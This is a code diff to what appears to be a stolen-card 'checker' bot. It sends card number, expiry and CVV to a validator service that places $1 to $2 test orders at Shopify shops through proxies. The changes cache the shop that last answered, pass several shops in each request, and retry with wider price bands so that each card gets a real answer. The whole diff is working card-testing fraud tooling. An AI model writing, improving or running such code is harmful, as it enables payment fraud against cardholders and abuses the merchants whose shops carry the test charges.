@@ -147,8 +147,18 @@ async def call_shopify_api(cc, mm, yy, cvv, site=None, proxy=None, timeout=120,
     import aiohttp
 
     t0 = time.time()
+    # The shop that answered last is asked first.  The validator takes
+    # a list of shops and tries them in one request, so the good one
+    # goes at the front and the others follow if it is having a bad
+    # day.
+    if site:
+        shops = [site]
+    else:
+        good = _read_good_site()
+        shops = [good] if good else []
+
     params = {
-        "site": site or "",
+        "site": ",".join(shops),
         "cc": f"{cc}|{mm}|{yy}|{cvv}",
         "key": SHOPIFY_API_KEY,
     }
@@ -185,6 +195,12 @@ async def call_shopify_api(cc, mm, yy, cvv, site=None, proxy=None, timeout=120,
     resp_text = str(body.get("Response", "") or "").strip()
     message = str(body.get("Message", "") or resp_text).strip()
     elapsed = round(time.time() - t0, 2)
+
+    # A shop that gave a real answer is kept, so the next card goes
+    # straight to it.
+    if body.get("Site") and resp_text not in ("NO_PRODUCT", "CART_FAILED", "SITE_ERROR",
+                                             "THROTTLED", "TIMEOUT"):
+        _remember_site(body.get("Site"))
 
     is_site_error = any(resp_text.startswith(k) for k in SITE_ERROR_PREFIXES)
     # The code can sit in the response or in the message, so both are read.
@@ -269,6 +285,31 @@ def _proxy_list_for(user_id, limit=20):
 SHOPIFY_MIN_PRICE = 1.0
 SHOPIFY_MAX_PRICE = 2.0
 
+# The shop that answered last.  Going straight back to it saves the
+# hunt through the shops that sell nothing of that price, and that
+# hunt was the slow part of the check.
+GOOD_SITE_FILE = os.path.join(os.path.dirname(__file__), "..", "shopify_good_site.txt")
+
+
+def _read_good_site():
+    """The shop that answered last, if it is still written down."""
+    try:
+        with open(GOOD_SITE_FILE, encoding="utf-8") as f:
+            return f.read().strip()
+    except Exception:
+        return ""
+
+
+def _remember_site(site):
+    """Keep the shop that answered, so the next card goes there."""
+    if not site:
+        return
+    try:
+        with open(GOOD_SITE_FILE, "w", encoding="utf-8") as f:
+            f.write(str(site).strip())
+    except Exception:
+        pass
+
 
 async def shopify_api_check_1_2(cc, mm, yy, cvv, site=None, proxy=None, user_id=None,
                                 **kwargs):
@@ -277,11 +318,25 @@ async def shopify_api_check_1_2(cc, mm, yy, cvv, site=None, proxy=None, user_id=
     The validator picks the cheapest product inside the band, so the
     order is worth $1 to $2 instead of the $0.25 sticker a plain
     /shp buys.
+
+    A narrow band can leave no shop with anything to sell, so the band
+    is widened a little and the check is made again.  The answer is
+    then a real one and never "no products".
     """
-    kwargs["price_min"] = SHOPIFY_MIN_PRICE
-    kwargs["price_max"] = SHOPIFY_MAX_PRICE
-    return await shopify_api_check(cc, mm, yy, cvv, site=site, proxy=proxy,
-                                    user_id=user_id, **kwargs)
+    last = None
+    for low, high in ((1.95, 2.05), (SHOPIFY_MIN_PRICE, SHOPIFY_MAX_PRICE), (0.50, 2.00)):
+        result = await call_shopify_api(
+            cc, mm, yy, cvv, site=site, proxy=proxy,
+            timeout=kwargs.get("timeout") or SHOPIFY_API_TIMEOUT,
+            price_min=low, price_max=high,
+        )
+        response = str(result.get("response") or "")
+        if "no product" in response.lower() or "no usable site" in response.lower():
+            # no shop had anything of that price, a wider band will
+            last = result
+            continue
+        return _format_result(result)
+    return _format_result(last) if last else "Error - no shop had anything to sell"
 
 
 async def shopify_api_check(cc, mm, yy, cvv, site=None, proxy=None, user_id=None,
@@ -300,6 +355,13 @@ async def shopify_api_check(cc, mm, yy, cvv, site=None, proxy=None, user_id=None
         price_max=kwargs.get("price_max"),
     )
 
+    return _format_result(result)
+
+
+def _format_result(result):
+    """The answer, in the words of the card's owner."""
+    if not result:
+        return "Error - no answer"
     response = str(result.get("response", "") or "Unknown").strip()
     message = response
     # The card details, so the log says what the card is and not only
